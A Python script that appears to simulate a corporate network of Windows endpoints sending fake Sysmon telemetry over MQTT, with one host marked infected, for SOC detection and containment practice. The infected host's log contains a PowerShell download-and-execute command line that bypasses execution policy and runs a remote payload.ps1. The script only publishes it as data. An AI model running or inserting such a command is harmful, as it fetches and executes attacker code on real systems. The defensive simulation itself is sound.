import time
import json
import random
import threading
import paho.mqtt.client as mqtt

BROKER = "localhost"
PORT = 1883

class EndpointWindows(threading.Thread):
    def __init__(self, hostname, modo_ataque=False):
        super().__init__()
        self.hostname = hostname
        self.modo_ataque = modo_ataque
        self.ativo = True
        self.topic_telemetria = f"stacholski/it/sensor/{hostname}"
        self.topic_comando = f"stacholski/it/comando/{hostname}"
        
        # ID único para o MQTT Broker não desconectar clientes repetidos
        self.client = mqtt.Client(f"EDR_{hostname}_{random.randint(1000,9999)}")
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message

    def on_connect(self, client, userdata, flags, rc):
        self.client.subscribe(self.topic_comando)

    def on_message(self, client, userdata, msg):
        comando = msg.payload.decode('utf-8')
        if comando == "ISOLATE_NETWORK":
            print(f"\n[⚡] SOC ORDENOU CONTENÇÃO: Isolando {self.hostname} da rede corporativa!")
            self.ativo = False # Interrompe o envio de logs (simula máquina fora da rede)

    def run(self):
        self.client.connect(BROKER, PORT, 60)
        self.client.loop_start()
        
        while self.ativo:
            if self.modo_ataque:
                process_name = "powershell.exe"
                command_line = "powershell.exe -ExecutionPolicy Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.15.x.x/payload.ps1')\""
                status = "SUSPICIOUS_ACTIVITY"
            else:
                processos = ["chrome.exe", "winword.exe", "excel.exe", "outlook.exe"]
                process_name = random.choice(processos)
                command_line = f"C:\\Program Files\\{process_name}"
                status = "NORMAL"

            payload = {
                "sensor_id": self.hostname,
                "timestamp": time.time(),
                "event_source": "Microsoft-Windows-Sysmon",
                "event_id": 1,
                "process_name": process_name,
                "command_line": command_line,
                "status": status
            }
            
            self.client.publish(self.topic_telemetria, json.dumps(payload))
            
            # Avisa na tela apenas se for ataque, para não flodar o terminal com processos normais
            if self.modo_ataque:
                print(f"[> ALERTA IT] {self.hostname} executando payload malicioso em background...")
            
            # Máquinas normais geram logs a cada 3~8 segundos. O ataque gera a cada 1 segundo.
            time.sleep(1.0 if self.modo_ataque else random.uniform(3.0, 8.0))

        self.client.loop_stop()
        self.client.disconnect()

# --- Configuração da Rede Corporativa ---
quantidade_pcs = 15
pc_infectado = "WIN-DESKTOP-07"

print(f"[*] Ligando a rede corporativa IT com {quantidade_pcs} computadores...")

endpoints = []
for i in range(1, quantidade_pcs + 1):
    # Formata o nome para ter dois dígitos (ex: WIN-DESKTOP-01)
    hostname = f"WIN-DESKTOP-{i:02d}"
    sob_ataque = (hostname == pc_infectado)
    
    ep = EndpointWindows(hostname, modo_ataque=sob_ataque)
    endpoints.append(ep)
    ep.start()
    print(f"[+] Endpoint {hostname} ingressado no domínio (Infectado: {sob_ataque})")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[-] Desligando todos os computadores...")
    for ep in endpoints:
        ep.ativo = False